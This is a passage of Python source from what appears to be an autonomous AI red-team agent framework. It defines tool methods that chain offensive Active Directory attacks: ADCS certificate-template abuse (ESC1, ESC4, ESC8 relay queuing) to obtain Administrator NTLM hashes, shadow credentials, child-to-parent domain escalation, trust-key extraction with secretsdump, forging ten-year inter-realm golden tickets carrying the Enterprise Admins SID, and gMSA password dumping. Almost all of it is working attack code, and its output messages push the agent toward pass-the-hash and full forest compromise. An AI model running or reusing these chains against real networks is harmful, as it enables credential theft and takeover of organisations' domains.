        elif block not in self.state.weaknesses:
            self.state.weaknesses.append(block)

    def _queue_esc8_vulnerability(
        self,
        certipy_output: str,
        domain: str,
        dc_ip: str,
        username: str,
        password: str | None,
    ) -> None:
        """
        Queue ESC8 vulnerability for exploitation when detected.

        ESC8 requires a two-step attack:
        1. Start ntlmrelayx_to_adcs to listen for relayed auth
        2. Use coercion (petitpotam/coercer) to force DC authentication

        This method adds the vulnerability to state so the orchestrator
        can dispatch the necessary coercion tasks.
        """
        if not self.state:
            logger.warning("Cannot queue ESC8 vulnerability: no state available")
            return

        # Extract CA information from certipy output
        ca_name = None
        ca_host = None

        def _is_valid_host(value: str) -> bool:
            """Check if value looks like a valid hostname or IP, not an error message."""
            if not value:
                return False
            # Error messages often contain brackets, "Errno", "refused", "error", etc.
            error_indicators = ["[", "]", "errno", "refused", "error", "failed", "timeout"]
            value_lower = value.lower()
            if any(ind in value_lower for ind in error_indicators):
                return False
            # Valid hostnames/IPs should only contain alphanumeric, dots, hyphens
            # Allow underscores too (sometimes seen in AD)
            return all(c.isalnum() or c in ".-_" for c in value)

        # Look for CA name in output (e.g., "CA Name: corp-DC01-CA")
        ca_match = re.search(r"CA Name\s*:\s*([^\n\r]+)", certipy_output, re.IGNORECASE)
        if ca_match:
            ca_name = ca_match.group(1).strip()

        # Look for CA host/DNS (e.g., "DNS Name: dc01.contoso.local")
        dns_match = re.search(
            r"(?:DNS Name|Web Services|Web Enrollment)\s*:\s*([^\n\r]+)",
            certipy_output,
            re.IGNORECASE,
        )
        if dns_match:
            extracted = dns_match.group(1).strip()
            # Only use if it looks like a valid hostname, not an error message
            if _is_valid_host(extracted):
                ca_host = extracted
            else:
                logger.warning(
                    f"Ignoring invalid ca_host extracted from certipy output: {extracted}"
                )

        # Validate dc_ip fallback - it might also be an error message
        validated_dc_ip = dc_ip if _is_valid_host(dc_ip) else None

        # Determine target - prefer ca_host, fall back to validated dc_ip
        target = ca_host or validated_dc_ip
        if not target:
            logger.warning(
                f"Cannot queue ESC8 vulnerability: no valid target "
                f"(ca_host={ca_host!r}, dc_ip={dc_ip!r})"
            )
            return

        # Create unique vulnerability ID
        vuln_id = f"ADCS_ESC8_{domain}_{uuid.uuid4().hex[:8]}"

        # Build details for exploitation
        details: dict[str, str | list[str] | None] = {
            "ca_name": ca_name,
            "ca_host": target,
            "domain": domain,
            "dc_ip": dc_ip,
            "username": username,
            "password": password,
            "attack_steps": [
                "1. Start ntlmrelayx_to_adcs to listen for relayed auth",
                "2. Use petitpotam or coercer to coerce DC authentication to attacker",
                "3. Relay will capture DC machine certificate",
                "4. Use certipy_auth with captured certificate to get DC machine hash",
                "5. Use hash for DCSync or pass-the-hash",
            ],
            "note": "ESC8 requires COERCION agent to force authentication. "
            "Dispatch coercion task after starting relay.",
        }

        # Create and add vulnerability to state
        vuln = VulnerabilityInfo(
            vuln_id=vuln_id,
            vuln_type="ADCS_ESC8",
            target=target,
            discovered_by="certipy_find",
            details=details,
            priority=3,  # High priority - ADCS_ESC8 is priority 3 in dispatcher
            recommended_agent="coercion",  # ntlmrelayx_to_adcs is on coercion pod
        )

        if not isinstance(self.state, SharedRedTeamState):
            logger.debug("State does not support add_vulnerability (not SharedRedTeamState)")
            return

        added = self.state.add_vulnerability(vuln)
        if added:
            logger.warning(
                f"[!] ESC8 vulnerability queued for exploitation: {vuln_id} "
                f"(CA: {ca_name or 'unknown'}, host: {target})"
            )
        else:
            logger.debug(f"ESC8 vulnerability already queued for {domain}")

    @dn.tool_method
    def certipy_find(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        vulnerable: bool = True,
    ) -> str:
        """
        Enumerate ADCS (Active Directory Certificate Services) for vulnerabilities.

        CRITICAL: ADCS vulnerabilities (ESC1-15) are among the most reliable paths
        to Domain Admin. Run this early if the domain has a CA.

        Common findings:
        - ESC1: Template allows client auth + requester specifies SAN
        - ESC4: Template misconfigured to allow low-priv enrollment
        - ESC8: Web enrollment (HTTP) endpoint allows NTLM relay

        Args:
            domain: Target domain
            username: Valid domain username
            password: Password for authentication
            dc_ip: Domain controller IP
            vulnerable: Only show vulnerable templates (default: True)

        Returns:
            ADCS enumeration results highlighting exploitable templates

        Example:
            >>> certipy_find("contoso.local", "user", "pass", "192.168.58.10")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        realm = domain.upper()
        krb5_conf = f"/tmp/ares-krb5-{uuid.uuid4().hex}.conf"  # nosec B108  # noqa: S108
        cmd_list = [
            "certipy",
            "find",
            "-u",
            f"{username}@{domain}",
            "-p",
            resolved_password or "",
            "-dc-ip",
            dc_ip,
            "-stdout",
        ]
        if vulnerable:
            cmd_list.append("-vulnerable")
        cmd_str = " ".join(shlex.quote(arg) for arg in cmd_list)
        cmd_script = (
            f"tmp_conf={krb5_conf}\n"
            "trap 'rm -f \"$tmp_conf\"' EXIT\n"
            "cat > \"$tmp_conf\" <<'EOF'\n"
            "[libdefaults]\n"
            f" default_realm = {realm}\n"
            " dns_lookup_kdc = false\n"
            " dns_lookup_realm = false\n"
            "[realms]\n"
            f" {realm} = {{\n"
            f"  kdc = {dc_ip}\n"
            " }\n"
            "[domain_realm]\n"
            f" .{domain} = {realm}\n"
            f" {domain} = {realm}\n"
            "EOF\n"
            f'env KRB5_CONFIG="$tmp_conf" {cmd_str}\n'
        )
        cmd: list[str] = ["bash", "-lc", cmd_script]

        try:
            logger.info(f"[*] Enumerating ADCS in {domain}")
            # Run locally on privesc agent (certipy is installed there, not on recon)
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=300)

            result = stdout + "\n" + (stderr or "")

            vuln_match = re.search(r"(ESC\d+)", result, re.IGNORECASE)
            if vuln_match:
                esc_type = vuln_match.group(1).upper()
                logger.warning(f"[!] ADCS vulnerability found: {esc_type}")
                result = (
                    f"🚨 ADCS VULNERABILITY DETECTED: {esc_type}!\n"
                    "\u2192 Use certipy_request to exploit vulnerable template\n"
                    "\u2192 Request certificate as Administrator\n\n" + result
                )
                block = format_weakness_block(
                    f"ADCS Vulnerability - {esc_type}",
                    f"Certificate template vulnerable to {esc_type}",
                    {},
                    "Allows impersonation of privileged accounts",
                    "Certipy ADCS enumeration",
                )
                self._add_weakness(block)

            if "esc8" in result.lower() or "web enrollment" in result.lower():
                logger.warning("[!] ESC8 detected - HTTP Web Enrollment vulnerable to relay!")
                if "🚨" not in result:
                    result = (
                        "🚨 ESC8 DETECTED - WEB ENROLLMENT RELAY POSSIBLE!\n"
                        "\u2192 Use ntlmrelayx_to_adcs to set up relay listener\n"
                        "\u2192 Use petitpotam or coercer to coerce DC authentication\n"
                        "\u2192 Then use certipy_auth with the captured certificate\n\n" + result
                    )

                # Auto-queue ESC8 vulnerability for exploitation
                # This ensures the orchestrator knows to dispatch coercion tasks
                self._queue_esc8_vulnerability(result, domain, dc_ip, username, resolved_password)

            return result

        except Exception as e:
            return f"Certipy find failed: {e}"

    @dn.tool_method
    def certipy_request(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        ca: str,
        template: str,
        upn: str = "Administrator",
    ) -> str:
        """
        Request a certificate using an exploitable template (ESC1/ESC4).

        After finding a vulnerable template with certipy_find, use this to request
        a certificate as any user (typically Administrator). Then use certipy_auth
        to convert the certificate to an NTLM hash.

        Args:
            domain: Target domain
            username: Valid domain username
            password: Password for authentication
            dc_ip: Domain controller IP
            ca: Certificate Authority name (from certipy_find output)
            template: Vulnerable template name (from certipy_find output)
            upn: Target user principal name (default: Administrator)

        Returns:
            Certificate request result (saves .pfx file if successful)

        Example:
            >>> certipy_request("contoso.local", "user", "pass", "192.168.58.10",
            ...                  "contoso-CA", "VulnTemplate", "Administrator")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        cmd = [
            "certipy",
            "req",
            "-u",
            f"{username}@{domain}",
            "-p",
            resolved_password or "",
            "-dc-ip",
            dc_ip,
            "-ca",
            ca,
            "-template",
            template,
            "-upn",
            f"{upn}@{domain}",
        ]

        try:
            logger.info(f"[*] Requesting certificate as {upn} using template {template}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if ".pfx" in result:
                logger.warning(f"[!] Certificate obtained for {upn}!")
                result = (
                    f"🎫 CERTIFICATE OBTAINED FOR {upn}!\n"
                    "\u2192 Use certipy_auth with the .pfx file to get NTLM hash\n"
                    "\u2192 Then use hash for pass-the-hash or secretsdump\n\n" + result
                )

            return result

        except Exception as e:
            return f"Certipy request failed: {e}"

    @dn.tool_method
    def certipy_auth(
        self,
        domain: str,
        dc_ip: str,
        pfx_path: str,
    ) -> str:
        """
        Authenticate with a certificate to obtain NTLM hash (PKINIT).

        After obtaining a certificate with certipy_request, use this to convert
        it to an NTLM hash via PKINIT authentication. The hash can then be used
        for pass-the-hash or secretsdump.

        Args:
            domain: Target domain
            dc_ip: Domain controller IP
            pfx_path: Path to the .pfx certificate file

        Returns:
            Authentication result including NTLM hash if successful

        Example:
            >>> certipy_auth("contoso.local", "192.168.58.10", "administrator.pfx")
        """
        cmd = [
            "certipy",
            "auth",
            "-pfx",
            pfx_path,
            "-dc-ip",
            dc_ip,
            "-domain",
            domain,
        ]

        try:
            logger.info(f"[*] Authenticating with certificate {pfx_path}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if "hash" in result.lower() or re.search(r"[a-fA-F0-9]{32}", result):
                logger.warning("[!] NTLM hash obtained from certificate!")
                result = (
                    "🚨 NTLM HASH OBTAINED!\n"
                    "\u2192 Use hash with secretsdump for full domain dump\n"
                    "\u2192 Or use with pass-the-hash for lateral movement\n\n" + result
                )

                if self.state:
                    hash_match = re.search(r"([a-fA-F0-9]{32}:[a-fA-F0-9]{32})", result)
                    if hash_match:
                        hash_obj = Hash(
                            username="Administrator",
                            hash_value=hash_match.group(1),
                            hash_type="NTLM",
                            domain=domain,
                        )
                        if hasattr(self.state, "add_hash"):
                            self.state.add_hash(hash_obj, "certipy_auth")
                        else:
                            self.state.hashes.append(hash_obj)

            return result

        except Exception as e:
            return f"Certipy auth failed: {e}"

    @dn.tool_method
    def certipy_shadow(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        target: str,
    ) -> str:
        """
        Abuse Key Credentials (shadow credentials) for PKINIT-based auth.

        Similar to pywhisker but integrated with certipy. Adds a certificate-based
        credential to a target user/computer's msDS-KeyCredentialLink attribute.

        Use when you have GenericAll or GenericWrite on a user/computer.

        Args:
            domain: Target domain
            username: Your username with GenericAll/GenericWrite
            password: Your password
            dc_ip: Domain controller IP
            target: Target account to add shadow credentials to

        Returns:
            Shadow credentials result (includes certificate if successful)

        Example:
            >>> certipy_shadow("contoso.local", "user", "pass", "192.168.58.10", "Administrator")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        cmd = [
            "certipy",
            "shadow",
            "auto",
            "-u",
            f"{username}@{domain}",
            "-p",
            resolved_password or "",
            "-dc-ip",
            dc_ip,
            "-target",
            target,
        ]

        try:
            logger.info(f"[*] Adding shadow credentials to {target}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if ".pfx" in result or "hash" in result.lower():
                logger.warning(f"[!] Shadow credentials attack successful on {target}!")
                result = (
                    f"🚨 SHADOW CREDENTIALS ADDED TO {target}!\n"
                    "\u2192 Certificate/hash obtained for the target\n"
                    "\u2192 Use for authentication or secretsdump\n\n" + result
                )

            return result

        except Exception as e:
            return f"Certipy shadow failed: {e}"

    @dn.tool_method
    def certipy_template_esc4(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        template: str,
    ) -> str:
        """
        Modify a certificate template for ESC4 exploitation.

        ESC4 occurs when a user has write permissions (GenericAll, WriteDacl, etc.)
        on a certificate template. This tool modifies the template to:
        - Allow enrollment by low-privileged users
        - Enable Client Authentication EKU
        - Allow specifying Subject Alternative Name (SAN)

        IMPORTANT: This modifies the template with -save-old to preserve the
        original configuration for later restoration.

        After modification, use certipy_request to request a certificate as
        Administrator, then certipy_auth to get the NTLM hash.

        Args:
            domain: Target domain
            username: User with write permissions on the template
            password: Password for authentication
            dc_ip: Domain controller IP
            template: Certificate template name to modify

        Returns:
            Template modification result (saves backup of original config)

        Example:
            >>> certipy_template_esc4("contoso.local", "user", "pass", "192.168.58.10", "ESC4")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        cmd = [
            "certipy",
            "template",
            "-u",
            f"{username}@{domain}",
            "-p",
            resolved_password or "",
            "-dc-ip",
            dc_ip,
            "-template",
            template,
            "-save-old",  # Save original config for restoration
        ]

        try:
            logger.info(f"[*] Modifying certificate template {template} for ESC4 exploitation")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if "successfully" in result.lower() or "saved" in result.lower():
                logger.warning(f"[!] Template {template} modified for ESC4!")
                result = (
                    f"🚨 TEMPLATE {template} MODIFIED FOR ESC4!\n"
                    "→ Original configuration saved (use -configuration to restore)\n"
                    "→ Template now allows enrollment with SAN specification\n"
                    "→ NEXT STEPS:\n"
                    "   1. Use certipy_request with -upn administrator@domain\n"
                    "   2. Use certipy_auth with the .pfx file\n"
                    "   3. Get Administrator NTLM hash!\n\n" + result
                )

            return result

        except Exception as e:
            return f"Certipy template modification failed: {e}"

    @dn.tool_method
    def certipy_esc4_full_chain(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        template: str,
        ca: str,
        target_upn: str = "Administrator",
    ) -> str:
        """
        Execute complete ESC4 attack chain in one step.

        This combines all ESC4 exploitation steps:
        1. Modify template to allow client auth with SAN
        2. Request certificate as target user (Administrator)
        3. Authenticate with certificate to get NTLM hash

        Use when you have GenericAll/WriteDacl on a certificate template.

        Args:
            domain: Target domain
            username: User with write permissions on the template
            password: Password for authentication
            dc_ip: Domain controller IP
            template: Certificate template name
            ca: Certificate Authority name
            target_upn: User to impersonate (default: Administrator)

        Returns:
            Full chain result including NTLM hash if successful
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        results = []

        # Step 1: Modify template
        logger.info(f"[*] ESC4 Chain Step 1: Modifying template {template}")
        template_result = self.certipy_template_esc4(
            domain=domain,
            username=username,
            password=password,
            dc_ip=dc_ip,
            template=template,
        )
        results.append(f"=== STEP 1: TEMPLATE MODIFICATION ===\n{template_result}\n")

        if "failed" in template_result.lower() or "error" in template_result.lower():
            return "\n".join(results) + "\n❌ ESC4 chain failed at template modification step"

        # Step 2: Request certificate
        logger.info(f"[*] ESC4 Chain Step 2: Requesting certificate as {target_upn}")
        request_result = self.certipy_request(
            domain=domain,
            username=username,
            password=password,
            dc_ip=dc_ip,
            ca=ca,
            template=template,
            upn=target_upn,
        )
        results.append(f"=== STEP 2: CERTIFICATE REQUEST ===\n{request_result}\n")

        # Extract PFX path from result
        pfx_match = re.search(r"(\S+\.pfx)", request_result)
        if not pfx_match:
            return "\n".join(results) + "\n❌ ESC4 chain failed: No PFX file created"

        pfx_path = pfx_match.group(1)

        # Step 3: Authenticate with certificate
        logger.info("[*] ESC4 Chain Step 3: Authenticating with certificate")
        auth_result = self.certipy_auth(
            domain=domain,
            dc_ip=dc_ip,
            pfx_path=pfx_path,
        )
        results.append(f"=== STEP 3: CERTIFICATE AUTHENTICATION ===\n{auth_result}\n")

        # Check for success
        if "hash" in auth_result.lower():
            final_message = (
                f"🚨 ESC4 FULL CHAIN COMPLETE!\n"
                f"→ Template {template} modified\n"
                f"→ Certificate obtained for {target_upn}\n"
                f"→ NTLM hash extracted!\n"
                f"→ Use hash for pass-the-hash or secretsdump\n\n"
            )
            return final_message + "\n".join(results)

        return "\n".join(results) + "\n⚠️ ESC4 chain completed but hash extraction may have failed"


class TrustAttackTools(Toolset):
    """Tools for Active Directory trust relationship attacks.

    These tools enable escalation from child to parent domains
    and cross-forest attacks.
    """

    state: SharedRedTeamState | None = None

    def set_state(self, state: SharedRedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def raise_child(
        self,
        child_domain: str,
        username: str,
        password: str,
        target_domain: str | None = None,
    ) -> str:
        """
        Escalate from child domain to parent domain (raiseChild.py).

        Automates the child-to-parent domain escalation using the krbtgt hash
        from the child domain to forge a golden ticket with Enterprise Admin SID.

        Use after obtaining krbtgt hash from a child domain via secretsdump.

        Args:
            child_domain: Child domain where you have krbtgt (e.g., "child.contoso.local")
            username: Username with access in child domain
            password: Password for authentication
            target_domain: Parent domain to escalate to (auto-detected if omitted)

        Returns:
            Escalation result with tickets and hashes

        Example:
            >>> raise_child("child.contoso.local", "administrator", "pass")
        """
        cmd = [
            "raiseChild.py",
            f"{child_domain}/{username}:{password}",
        ]

        if target_domain:
            cmd.extend(["-target-domain", target_domain])

        try:
            target_desc = f" -> {target_domain}" if target_domain else " (auto-detect parent)"
            logger.warning(
                f"🔺 CHILD-TO-PARENT ESCALATION: raise_child invoked\n"
                f"   Child domain: {child_domain}\n"
                f"   Target: {target_desc}\n"
                f"   Username: {username}"
            )
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=300)

            result = stdout + "\n" + (stderr or "")

            if "enterprise admin" in result.lower() or "golden ticket" in result.lower():
                logger.warning(
                    f"🎯 CHILD-TO-PARENT ESCALATION SUCCESS!\n"
                    f"   {child_domain} -> Enterprise Admin in parent domain"
                )
                result = (
                    "🚨 DOMAIN ESCALATION SUCCESSFUL!\n"
                    "\u2192 Enterprise Admin access obtained\n"
                    "\u2192 Use secretsdump on parent domain DCs\n\n" + result
                )

            return result

        except Exception as e:
            return f"raiseChild failed: {e}"

    @dn.tool_method
    def extract_trust_key(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        trusted_domain: str,
    ) -> str:
        """
        Extract trust key for cross-domain/cross-forest attacks.

        Requires Domain Admin on the source domain. The trust key is the NTLM hash
        of the trust account (TRUSTEDDOMAIN$) which can be used to create inter-realm
        tickets for cross-forest pivoting.

        Attack chain:
        1. Extract trust key (this tool)
        2. Get domain SIDs for both domains (get_sid)
        3. Create inter-realm ticket (create_inter_realm_ticket)
        4. Use ticket to access target forest

        Args:
            domain: Source domain where you have DA (e.g., 'contoso.local')
            username: Domain Admin username
            password: DA password
            dc_ip: Source domain controller IP
            trusted_domain: Target trusted domain (e.g., 'fabrikam.local' or 'FABRIKAM')

        Returns:
            Trust key (NTLM hash of trust account)

        Example:
            >>> extract_trust_key("contoso.local", "Administrator", "pass", "192.168.58.10", "fabrikam.local")
        """
        # Normalize trusted domain name to get trust account
        # Trust accounts are NETBIOS$, e.g., FABRIKAM$
        trust_domain_name = trusted_domain.split(".", maxsplit=1)[0].upper()
        trust_account = f"{trust_domain_name}$"

        # Check if password is actually an NTLM hash
        # Formats: "LM:NT" (64 chars with colon) or just "NT" (32 chars)
        is_lm_nt = bool(re.match(r"^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$", password))
        is_nt_only = bool(re.match(r"^[a-fA-F0-9]{32}$", password))
        is_hash = is_lm_nt or is_nt_only

        if is_hash:
            # Pass-the-hash: use -hashes flag
            # impacket expects LM:NT format - use empty LM if only NT provided
            hash_arg = password if is_lm_nt else f":{password}"
            cmd = [
                "impacket-secretsdump",
                f"{domain}/{username}@{dc_ip}",
                "-hashes",
                hash_arg,
                "-just-dc-user",
                trust_account,
            ]
        else:
            # Password auth
            cmd = [
                "impacket-secretsdump",
                f"{domain}/{username}:{password}@{dc_ip}",
                "-just-dc-user",
                trust_account,
            ]

        try:
            logger.warning(
                f"🔐 TRUST KEY EXTRACTION: secretsdump for cross-forest attack\n"
                f"   Source domain: {domain}\n"
                f"   Target trust: {trusted_domain}\n"
                f"   Trust account: {trust_account}\n"
                f"   DC: {dc_ip}"
            )
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=300)

            result = stdout + "\n" + (stderr or "")

            # Look for NTLM hash in output
            # Format: DOMAIN\TRUSTACCOUNT$:RID:LM:NT:::
            hash_match = re.search(
                rf"{trust_account}:\d+:[a-fA-F0-9]{{32}}:([a-fA-F0-9]{{32}})",
                result,
                re.IGNORECASE,
            )

            if hash_match:
                trust_hash = hash_match.group(1)
                logger.warning(
                    f"🎯 TRUST KEY EXTRACTED!\n"
                    f"   Trust: {domain} <-> {trusted_domain}\n"
                    f"   Account: {trust_account}\n"
                    f"   Hash: {trust_hash[:8]}...{trust_hash[-8:]}"
                )
                result = (
                    f"🚨 TRUST KEY EXTRACTED FOR {trusted_domain}!\n"
                    f"→ Trust account: {trust_account}\n"
                    f"→ NTLM hash: {trust_hash}\n"
                    f"→ Use with create_inter_realm_ticket for cross-forest access\n"
                    f"→ ATTACK CHAIN:\n"
                    f"   1. Get both domain SIDs with get_sid\n"
                    f"   2. Create inter-realm ticket with create_inter_realm_ticket\n"
                    f"   3. Use ticket to secretsdump target forest DCs\n\n" + result
                )

                # Add trust key as hash to state for tracking
                if self.state:
                    from ares.core.models import Hash, SharedRedTeamState

                    trust_hash_obj = Hash(
                        username=trust_account,
                        hash_value=trust_hash,
                        hash_type="NTLM",
                        domain=domain,
                        source="trust_key_extraction",
                    )
                    if isinstance(self.state, SharedRedTeamState):
                        self.state.add_hash(trust_hash_obj, "extract_trust_key")
                    elif hasattr(self.state, "hashes"):
                        self.state.hashes.append(trust_hash_obj)

            return result

        except Exception as e:
            return f"Trust key extraction failed: {e}"

    @dn.tool_method
    def create_inter_realm_ticket(
        self,
        source_domain: str,
        source_sid: str,
        trust_key: str,
        target_domain: str,
        target_sid: str,
        username: str = "Administrator",
        duration: int = 3650,
    ) -> str:
        """
        Create inter-realm golden ticket for cross-forest attack.

        Use after extracting trust key with extract_trust_key. Creates a ticket
        that grants Enterprise Admin access in the target forest.

        Args:
            source_domain: Domain where we have DA (e.g., 'contoso.local')
            source_sid: SID of source domain (from get_sid)
            trust_key: NTLM hash of trust account (from extract_trust_key)
            target_domain: Target trusted domain (e.g., 'fabrikam.local')
            target_sid: SID of target domain (from get_sid on target)
            username: User to impersonate (default: Administrator)
            duration: Ticket validity in days (default: 3650 = 10 years)

        Returns:
            Ticket generation result (saves .ccache file)

        Example:
            >>> create_inter_realm_ticket(
            ...     "contoso.local",
            ...     "S-1-5-21-123...",
            ...     "aad3b435...",
            ...     "fabrikam.local",
            ...     "S-1-5-21-456...",
            ... )
        """
        # Create Enterprise Admins SID for target forest (-519)
        enterprise_admin_sid = f"{target_sid}-519"

        cmd = [
            "impacket-ticketer",
            "-nthash",
            trust_key,
            "-domain-sid",
            source_sid,
            "-domain",
            source_domain,
            "-extra-sid",
            enterprise_admin_sid,
            "-spn",
            f"krbtgt/{target_domain}",
            "-duration",
            str(duration),
            username,
        ]

        try:
            logger.warning(
                f"🎫 INTER-REALM TICKET CREATION: Golden ticket with extra-sid\n"
                f"   Source: {source_domain} (SID: {source_sid})\n"
                f"   Target: {target_domain} (SID: {target_sid})\n"
                f"   EA SID: {enterprise_admin_sid}\n"
                f"   User: {username}"
            )
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if ".ccache" in result:
                ticket_match = re.search(r"([^\s]+\.ccache)", result)
                ticket_path = ticket_match.group(1) if ticket_match else f"{username}.ccache"
                logger.warning(
                    f"🎯 INTER-REALM TICKET CREATED!\n"
                    f"   Ticket: {ticket_path}\n"
                    f"   Access: Enterprise Admin in {target_domain}"
                )
                result = (
                    f"🚨 INTER-REALM TICKET CREATED!\n"
                    f"→ Ticket: {ticket_path}\n"
                    f"→ User: {username}\n"
                    f"→ Access: Enterprise Admin in {target_domain}\n"
                    f"→ NEXT STEPS:\n"
                    f"   1. export KRB5CCNAME={ticket_path}\n"
                    f"   2. secretsdump_kerberos to dump {target_domain} DCs\n"
                    f"   3. Full forest compromise achieved!\n\n" + result
                )

                if self.state:
                    self.state.has_golden_ticket = True
                    if hasattr(self.state, "operation_timeline"):
                        from ares.core.models import TimelineEvent

                        event = TimelineEvent(
                            id=f"evt-interrealm-{uuid.uuid4().hex[:8]}",
                            timestamp=datetime.now(timezone.utc),
                            source="create_inter_realm_ticket",
                            event_type="inter_realm_ticket",
                            description=f"Inter-realm ticket created for cross-forest attack: {source_domain} → {target_domain}",
                            mitre_technique="T1558.001",
                        )
                        self.state.operation_timeline.append(event)

            return result

        except Exception as e:
            return f"Inter-realm ticket creation failed: {e}"


class GMSATools(Toolset):
    """Tools for Group Managed Service Account (gMSA) password retrieval."""

    state: SharedRedTeamState | None = None

    def set_state(self, state: SharedRedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def gmsa_dump_passwords(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """Dump gMSA (Group Managed Service Account) passwords.

        gMSA accounts have auto-rotating passwords managed by AD. If you have
        read access to the msDS-ManagedPassword attribute (via PrincipalsAllowedToRetrieveManagedPassword),
        you can retrieve the NTLM hash of the gMSA account.

        gMSA accounts often have:
        - Service account privileges on multiple servers
        - SQL Server service accounts (can lead to xp_cmdshell)
        - IIS/web application service accounts
        - Scheduled task execution privileges

        Args:
            domain: Target domain (e.g., 'contoso.local')
            username: User with gMSA read rights
            password: Password for authentication
            dc_ip: Domain controller IP

        Returns:
            gMSA account names and their NTLM hashes
        """
        resolved_password = resolve_password(self.state, username, domain, password)
        if not resolved_password:
            return f"❌ No password available for {username}@{domain}"

        cmd = [
            "gMSADumper.py",
            "-d",
            domain,
            "-u",
            username,
            "-p",
            resolved_password,
            "-l",
            dc_ip,
        ]

        try:
            logger.info(f"[*] Dumping gMSA passwords from {domain}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            # Extract gMSA hashes from output
            # Pattern: gMSA_Account$:::NTLM_HASH
            hash_pattern = r"(\S+\$?):::([a-fA-F0-9]{32})"
            found_hashes = []

            for match in re.finditer(hash_pattern, result):
                account = match.group(1)
                ntlm_hash = match.group(2)
                found_hashes.append((account, ntlm_hash))

                logger.warning(f"[+] gMSA hash found: {account}")

                if self.state and hasattr(self.state, "add_hash"):
                    hash_obj = Hash(
                        username=account,
                        hash_value=ntlm_hash,
                        hash_type="NTLM",
                        domain=domain,
                        source="gMSADumper",
                    )
                    self.state.add_hash(hash_obj)  # type: ignore[union-attr]

            if found_hashes:
                hash_summary = "\n".join(f"  - {acc}: {h[:16]}..." for acc, h in found_hashes)
                return (
                    f"✅ gMSA passwords retrieved!\n"
                    f"Found {len(found_hashes)} gMSA account(s):\n{hash_summary}\n\n"
                    f"→ Use these hashes with pass-the-hash (psexec/wmiexec) on servers where gMSA has access\n"
                    f"→ gMSA accounts often run SQL Server, IIS, or scheduled tasks\n\n"
                    f"{result}"
                )

            return f"gMSADumper result (no hashes extracted):\n{result}"

        except Exception as e:
            return f"gMSADumper failed: {e}"

    @dn.tool_method
    def gmsa_read_password_bloodyad(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        gmsa_account: str,
    ) -> str:
        """Read a specific gMSA account's password using bloodyAD.

        Alternative to gMSADumper for targeted gMSA password retrieval.
        Use this when you know the specific gMSA account name.

        Args:
            domain: Target domain (e.g., 'contoso.local')
            username: User with gMSA read rights
            password: Password for authentication
            dc_ip: Domain controller IP
            gmsa_account: gMSA account name (e.g., 'svc_sql$')

        Returns:
            gMSA account NTLM hash
        """
        resolved_password = resolve_password(self.state, username, domain, password)
        if not resolved_password:
            return f"❌ No password available for {username}@{domain}"

        cmd = [
            "bloodyAD",
            "-d",
            domain,
            "-u",
            username,
            "-p",
            resolved_password,
            "--host",
            dc_ip,
            "get",
            "object",
            gmsa_account,
            "--attr",
            "msDS-ManagedPassword",
        ]

        try:
            logger.info(f"[*] Reading gMSA password for {gmsa_account}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=60)

            result = stdout + "\n" + (stderr or "")

            # bloodyAD returns the password data which can be converted to NTLM
            if "msDS-ManagedPassword" in result or "NTLM" in result.upper():
                hash_match = re.search(r"([a-fA-F0-9]{32})", result)
                if hash_match:
                    ntlm_hash = hash_match.group(1)
                    logger.warning(
                        f"[+] gMSA hash retrieved for {gmsa_account}: {ntlm_hash[:16]}..."
                    )

                    if self.state and hasattr(self.state, "add_hash"):
                        hash_obj = Hash(
                            username=gmsa_account,
                            hash_value=ntlm_hash,
                            hash_type="NTLM",
                            domain=domain,
                            source="bloodyAD_gMSA",
                        )
                        self.state.add_hash(hash_obj)  # type: ignore[union-attr]

                    return (
                        f"✅ gMSA password retrieved for {gmsa_account}!\n"
                        f"→ NTLM: {ntlm_hash[:16]}...\n"
                        f"→ Use pass-the-hash on servers where {gmsa_account} has access\n\n"
                        f"{result}"
                    )

            return f"bloodyAD gMSA result:\n{result}"

        except Exception as e:
            return f"bloodyAD gMSA read failed: {e}"
